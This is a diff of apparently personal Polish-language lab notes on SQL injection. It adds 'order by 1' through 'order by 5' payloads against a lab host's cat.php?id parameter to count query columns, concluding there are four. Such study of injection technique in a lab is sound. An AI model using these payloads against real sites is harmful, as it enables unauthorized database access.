@@ -1,5 +1,21 @@
 TODO: sprawdzic ile kolumn jest
 
+komendy:
+
+```
+http://192.168.56.6/cat.php?id=1 order by 1
+http://192.168.56.6/cat.php?id=1 order by 2
+http://192.168.56.6/cat.php?id=1 order by 3
+http://192.168.56.6/cat.php?id=1 order by 4
+```
+
+```
+http://192.168.56.6/cat.php?id=1 order by 5
+```
+
+![alt text](../img/image_col.png)
+
+dopiro przy order by 5 wyskakuje bląd, zatem kolumn jest 4
 ```
 http://vulnerable/cat.php?id=1%20dowolny%20string
 ```
